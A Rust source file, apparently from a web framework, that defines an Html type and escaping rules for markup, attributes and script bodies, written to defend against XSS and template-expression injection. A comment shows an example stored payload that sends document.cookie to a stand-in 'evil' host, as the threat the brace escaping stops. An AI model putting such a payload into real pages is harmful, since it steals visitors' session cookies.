//! The HTML value type and the escaping rules around it.

use axum::http::{HeaderValue, header};
use axum::response::{IntoResponse, Response};

use crate::attrs::Presence;

#[cfg(test)]
#[path = "tests/html.rs"]
mod tests;

/// A finished chunk of markup.
///
/// The inner string is trusted: it comes out of `html!`, which escapes
/// everything interpolated into it. Building one from an untrusted string
/// means going through [`Html::from_raw`], and that is the only place raw
/// markup can enter.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Html(String);

impl Html {
    /// Take a string as markup, unescaped.
    ///
    /// Callers are responsible for the contents. `html!` uses this after it
    /// has escaped every interpolated value.
    pub fn from_raw(raw: String) -> Self {
        Html(raw)
    }

    /// Nothing at all — what a caller passes for `children` it has no content
    /// for.
    ///
    /// This is also `Html`'s [`Default`], which is what a component tag takes
    /// for a `children: Html` prop it leaves out: `<Card title="…" />` and
    /// `<Card title="…"></Card>` both arrive here. A component checks for it
    /// with [`Html::is_empty`] when it wants to render a fallback instead.
    pub fn empty() -> Self {
        Html(String::new())
    }

    /// Join several fragments into one value.
    ///
    /// `html!` renders a single parent element, so a list built in a loop is
    /// several `Html` values rather than one. This is how they become the one
    /// value a `children` argument takes — the pieces land side by side
    /// wherever `<slot />` puts them, inside whatever element the component
    /// wraps them in.
    pub fn concat<I: IntoIterator<Item = Html>>(parts: I) -> Self {
        let mut out = String::new();
        for part in parts {
            out.push_str(&part.0);
        }
        Html(out)
    }

    /// Escape a string and wrap the result, for markup built by hand.
    pub fn escape(text: &str) -> Self {
        let mut out = String::with_capacity(text.len());
        escape_text_into(text, &mut out);
        Html(out)
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }

    pub fn into_string(self) -> String {
        self.0
    }

    pub fn is_empty(&self) -> bool {
        self.0.is_empty()
    }
}

/// Marks a response whose body is a page fragment a layout may wrap.
///
/// Layout layers sit above every route in their subtree, including API
/// handlers and static files. Without this, `route.rs` returning JSON would
/// come back wrapped in `<!DOCTYPE html>`.
#[derive(Debug, Clone, Copy)]
pub struct PageBody;

impl IntoResponse for Html {
    fn into_response(self) -> Response {
        let mut res = self.0.into_response();
        res.headers_mut().insert(
            header::CONTENT_TYPE,
            HeaderValue::from_static("text/html; charset=utf-8"),
        );
        res.extensions_mut().insert(PageBody);
        res
    }
}

/// A value `html!` can interpolate.
///
/// Implemented by hand rather than blanket-over-`Display`, so that `Html`
/// can opt out of escaping while everything else cannot.
pub trait Render {
    /// Write into element content.
    fn render_into(&self, out: &mut String);

    /// Write into a double-quoted attribute value. Defaults to the text
    /// rules plus `"`.
    fn render_attr_into(&self, out: &mut String) {
        self.render_into(out);
    }

    /// Does this value put an attribute on the element at all?
    ///
    /// Defaults to [`Presence::Value`] — a value is written — which is the
    /// answer for a string, a number, and anything an application implements
    /// this trait for. The two that answer differently are the two JSX treats
    /// specially: `Option::None` writes nothing, and a `bool` on a boolean
    /// attribute writes `name=""` or nothing at all.
    ///
    /// `boolean` says whether the attribute is one HTML reads by presence.
    /// `html!` decides that from the name at compile time, because the same
    /// `false` means opposite things on `disabled` and on `aria-hidden`: the
    /// first must disappear, and the second must stay and say `false`.
    fn attribute_presence(&self, boolean: bool) -> Presence {
        let _ = boolean;
        Presence::Value
    }
}

impl Render for Html {
    /// Already escaped — passes through, which is what makes `<slot />` and
    /// nested components compose.
    fn render_into(&self, out: &mut String) {
        out.push_str(&self.0);
    }
}

impl Render for str {
    fn render_into(&self, out: &mut String) {
        escape_text_into(self, out);
    }

    fn render_attr_into(&self, out: &mut String) {
        escape_attr_into(self, out);
    }
}

impl Render for String {
    fn render_into(&self, out: &mut String) {
        escape_text_into(self, out);
    }

    fn render_attr_into(&self, out: &mut String) {
        escape_attr_into(self, out);
    }
}

impl<T: Render + ?Sized> Render for &T {
    fn render_into(&self, out: &mut String) {
        (**self).render_into(out);
    }

    fn render_attr_into(&self, out: &mut String) {
        (**self).render_attr_into(out);
    }

    fn attribute_presence(&self, boolean: bool) -> Presence {
        (**self).attribute_presence(boolean)
    }
}

/// Renders the value if present, nothing if not — the usual way to make an
/// attribute or a block conditional.
impl<T: Render> Render for Option<T> {
    fn render_into(&self, out: &mut String) {
        if let Some(value) = self {
            value.render_into(out);
        }
    }

    fn render_attr_into(&self, out: &mut String) {
        if let Some(value) = self {
            value.render_attr_into(out);
        }
    }

    /// Absent means the attribute is not written — `href=@{None}` renders no
    /// `href`, rather than an empty one pointing at the current page. What is
    /// present answers for itself, so `Option<bool>` behaves like the `bool`
    /// inside it.
    fn attribute_presence(&self, boolean: bool) -> Presence {
        match self {
            Some(value) => value.attribute_presence(boolean),
            None => Presence::Absent,
        }
    }
}

/// A flag, which on a boolean attribute is the attribute itself.
///
/// `disabled=@{false}` writes no `disabled`, because HTML reads that attribute
/// by whether it is there — `disabled="false"` disables the control. On any
/// other name the flag is an ordinary value: `aria-hidden=@{false}` writes
/// `aria-hidden="false"`, which is a different thing from writing nothing.
impl Render for bool {
    fn render_into(&self, out: &mut String) {
        out.push_str(if *self { "true" } else { "false" });
    }

    fn attribute_presence(&self, boolean: bool) -> Presence {
        match (boolean, self) {
            (false, _) => Presence::Value,
            (true, true) => Presence::Empty,
            (true, false) => Presence::Absent,
        }
    }
}

/// Numbers need no escaping, so they go straight in.
macro_rules! render_via_display {
    ($($ty:ty),* $(,)?) => {
        $(impl Render for $ty {
            fn render_into(&self, out: &mut String) {
                use ::std::fmt::Write;
                let _ = write!(out, "{self}");
            }
        })*
    };
}

render_via_display!(
    char, u8, u16, u32, u64, u128, usize, i8, i16, i32, i64, i128, isize, f32, f64
);

// ------------------------------------------------------------------- script
// The script half of interpolation. Mirrors `Render` from the document side
// rather than sharing it, for the reasons below; everything in this section
// is reached inside a `<script>` body where the macro lifts `@{expr}` past the
// raw-text rule that would otherwise copy it through as JS source.

/// What `@{…}` inside a `<script>` body can interpolate.
///
/// `@{…}` outside a script renders as HTML: a value is escaped as text or an
/// attribute, and a string lands without quotes. Inside a script body the
/// same value has to arrive as self-contained JavaScript source — a number
/// literal for a number, a quoted string for a string, a JSON literal for a
/// struct — because the client runtime evaluates the body verbatim. That is a
/// different set of rules, owned by JS rather than HTML, so it has its own
/// trait rather than overloading `Render`.
///
/// ```ignore
/// html! {
///     <section>
///         <p>"Logged in as "@{user.name}</p>
///         <script>r##"
///             const [count, setCount] = pp.state(@{42});
///             const [name, setName] = pp.state(@{"Ada"});
///             const user = @{Json(&user)};
///         "##</script>
///     </section>
/// }
/// ```
///
/// Primitives write themselves through `Display` — a number is `42`, a flag
/// is `true` — which is the same spelling JS uses. Strings go through
/// `serde_json::to_string`, which is the JSON string literal the author would
/// have written by hand. Anything larger wraps itself in [`Json`] and goes
/// through `serde_json`, which lands as a JSON object, array or literal that
/// JS reads as its own source before the runtime ever sees it.
pub trait RenderJs {
    /// Write the value as valid, self-contained JavaScript source.
    ///
    /// Nothing in the output may close the surrounding `<script>` or open a
    /// conditional comment, which is what [`neutralise_script_breakouts`] is
    /// for; implementations route quoted or serialised text through it.
    fn render_js_into(&self, out: &mut String);
}

impl RenderJs for str {
    fn render_js_into(&self, out: &mut String) {
        // A JSON string literal is the spelling the author would have written,
        // and `serde_json`'s escaping is the one nobody re-implements. The
        // `<` neutralisation below is what stops a string carrying
        // `</script>` from ending the script early.
        let body = serde_json::to_string(self).expect("a `str` always serialises to a JSON string");
        out.push_str(&neutralise_script_breakouts(&body));
    }
}

impl RenderJs for String {
    fn render_js_into(&self, out: &mut String) {
        str::render_js_into(self, out);
    }
}

impl<T: RenderJs + ?Sized> RenderJs for &T {
    fn render_js_into(&self, out: &mut String) {
        (**self).render_js_into(out);
    }
}

/// Renders the value if present, `null` if not — the literal JS spells for an
/// absent optional, the way `Render` spells it as nothing in markup.
impl<T: RenderJs> RenderJs for Option<T> {
    fn render_js_into(&self, out: &mut String) {
        match self {
            Some(value) => value.render_js_into(out),
            None => out.push_str("null"),
        }
    }
}

/// Integers and flags need no quoting, so they go straight in — JSON, JS and
/// HTML spell them the same way.
macro_rules! render_js_via_display {
    ($($ty:ty),* $(,)?) => {
        $(impl RenderJs for $ty {
            fn render_js_into(&self, out: &mut String) {
                use ::std::fmt::Write;
                let _ = write!(out, "{self}");
            }
        })*
    };
}

render_js_via_display!(
    bool, u8, u16, u32, u64, u128, usize, i8, i16, i32, i64, i128, isize
);

/// A float is written as a number, and `NaN` or an infinity as `null`: a
/// component script's values arrive as JSON, which has no spelling for them.
macro_rules! render_js_float {
    ($($ty:ty),*) => {
        $(impl RenderJs for $ty {
            fn render_js_into(&self, out: &mut String) {
                use ::std::fmt::Write;
                if self.is_finite() {
                    let _ = write!(out, "{self}");
                } else {
                    out.push_str("null");
                }
            }
        })*
    };
}

render_js_float!(f32, f64);

/// A character is a one-character string.
impl RenderJs for char {
    fn render_js_into(&self, out: &mut String) {
        let mut buffer = [0; 4];
        str::render_js_into(self.encode_utf8(&mut buffer), out);
    }
}

/// A `Serialize` value interpolated as a JSON literal inside a `<script>`.
///
/// This is the bridge for anything that is not a primitive or a string — a
/// struct, a map, a `Vec`, a `serde_json::Value` — the way `pp.state(…)`
/// expects to be seeded: with one literal, not a hand-built object.
///
/// ```ignore
/// let user = User { name: "Ada", admin: true };
/// let rows: Vec<Row> = query().await?;
/// html! {
///     <script>r##"
///         const user = @{Json(&user)};
///         const rows = @{Json(&rows)};
///     "##</script>
/// }
/// ```
///
/// `serde_json` spells booleans, `null`, numbers, strings and the rest the way
/// JS does, so its output passes straight through. The one retailoring is
/// [`neutralise_script_breakouts`]: a `<` inside a string value would close
/// the surrounding `<script>` in the HTML parser, so it is rewritten as a JS
/// unicode escape that the HTML parser ignores and the JS parser decodes
/// back to `<`.
pub struct Json<T: serde::Serialize>(pub T);

impl<T: serde::Serialize> RenderJs for Json<T> {
    fn render_js_into(&self, out: &mut String) {
        let body = serde_json::to_string(&self.0).expect(
            "Rahti: `serde_json::to_string` failed on a `Json` interpoland. `NaN` and \
             `Infinity` are not representable in JSON — either drop the field, branch to \
             `None` on it, or interpolate the bare value through its own `RenderJs` impl \
             (it accepts them as JS literals).",
        );
        out.push_str(&neutralise_script_breakouts(&body));
    }
}

/// `JSON.parse`-safe and `<script>`-safe in one step.
///
/// The HTML parser ends a `<script>` on the first `</`, no matter whose string
/// literal it sits in, and a `<!--` inside the body opens a comment that the
/// parser only ends back out of with `-->` if it ever sees one. JSON has `<`
/// only inside string values, never as a structural token, so rewriting every
/// `<` to `\u003c` is invisible to a JSON reader and removes both holes at
/// once: the JS parser decodes the escape back to `<`, but the HTML parser
/// never sees a tag start or a comment open.
fn neutralise_script_breakouts(json: &str) -> String {
    if !json.contains('<') {
        // The common case — NaN-free numbers, structs without string data —
        // so the `\u003c` rewrite does not allocate a fresh `String`.
        return json.to_string();
    }
    json.replace('<', "\\u003c")
}

// A value's braces are written as character references, in text and in
// attributes alike. PulsePoint compiles the rendered page: a `{…}` whose body
// parses as JavaScript is an expression it evaluates, and braces are not
// HTML-special, so a stored `{fetch('//evil/' + document.cookie)}` would pass
// HTML escaping untouched and run in the browser. `&#123;` shows a brace
// wherever the browser renders it, and inside the root layout's deferred
// `<template pp-component>` it is raised one more layer (see
// [`render_deferred_children`]) so the runtime reads a reference rather than
// the start of an expression. `Html::from_raw` is the trust boundary: markup
// built through it keeps its braces live.

fn escape_text_into(text: &str, out: &mut String) {
    out.reserve(text.len());
    for c in text.chars() {
        match c {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '{' => out.push_str("&#123;"),
            '}' => out.push_str("&#125;"),
            c => out.push(c),
        }
    }
}

pub(crate) fn escape_attr_into(text: &str, out: &mut String) {
    escape_attr_with(text, out, true);
}

/// The attribute rules for client source an author wrote — a `{…}` binding
/// `html!` hands down — whose braces are the expression and stay live.
pub(crate) fn escape_source_attr_into(text: &str, out: &mut String) {
    escape_attr_with(text, out, false);
}

fn escape_attr_with(text: &str, out: &mut String, braces: bool) {
    out.reserve(text.len());
    for c in text.chars() {
        match c {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            '{' if braces => out.push_str("&#123;"),
            '}' if braces => out.push_str("&#125;"),
            c => out.push(c),
        }
    }
}

/// The brace references the client runtime recognises, matched without
/// regard to case. `html!` sends an authored one already doubled; these are
/// the single-layer forms a value, or `Html::from_raw` markup, carries.
const BRACE_REFERENCES: [&str; 6] = [
    "&#123;", "&#125;", "&#x7b;", "&#x7d;", "&lbrace;", "&rbrace;",
];

/// Write a root layout's children into the deferred `<template
/// pp-component>` that `html!` wraps around its `<slot />`.
///
/// The browser decodes one layer of character references while it parses
/// the response, so a value's `&#123;` would reach the runtime as a bare `{`
/// and be compiled as an expression. Every single-layer brace reference is
/// written as `&amp;#123;` instead: the parse leaves `&#123;` standing, and
/// the runtime renders a literal brace. A reference that is already doubled
/// has no `&#` to match and passes through, as does everything inside
/// `<script>` and `<style>`, whose bodies the browser never decodes.
#[doc(hidden)]
pub fn render_deferred_children(children: &Html, out: &mut String) {
    let html = children.as_str();
    out.reserve(html.len() + 32);
    let mut rest = html;
    while let Some(at) = rest.find(['&', '<']) {
        out.push_str(&rest[..at]);
        let tail = &rest[at..];
        let taken = if tail.starts_with('<') {
            let end = raw_text_element_len(tail).unwrap_or(1);
            out.push_str(&tail[..end]);
            end
        } else if let Some(reference) = BRACE_REFERENCES.iter().find(|reference| {
            tail.get(..reference.len())
                .is_some_and(|head| head.eq_ignore_ascii_case(reference))
        }) {
            out.push_str("&amp;");
            out.push_str(&tail[1..reference.len()]);
            reference.len()
        } else {
            out.push('&');
            1
        };
        rest = &tail[taken..];
    }
    out.push_str(rest);
}

/// The length of the `<script>…</script>` or `<style>…</style>` element that
/// `tail` opens, through its end tag — or the rest of the input when the end
/// tag is missing. `None` when `tail` opens anything else.
fn raw_text_element_len(tail: &str) -> Option<usize> {
    let name = ["script", "style"].into_iter().find(|name| {
        let after = 1 + name.len();
        tail.get(1..after)
            .is_some_and(|tag| tag.eq_ignore_ascii_case(name))
            && tail[after..].starts_with(|c: char| c.is_ascii_whitespace() || c == '>' || c == '/')
    })?;
    let lower = tail.to_ascii_lowercase();
    let close = format!("</{name}");
    let Some(close_at) = lower[1..].find(&close).map(|at| at + 1) else {
        return Some(tail.len());
    };
    Some(
        lower[close_at..]
            .find('>')
            .map_or(tail.len(), |end| close_at + end + 1),
    )
}
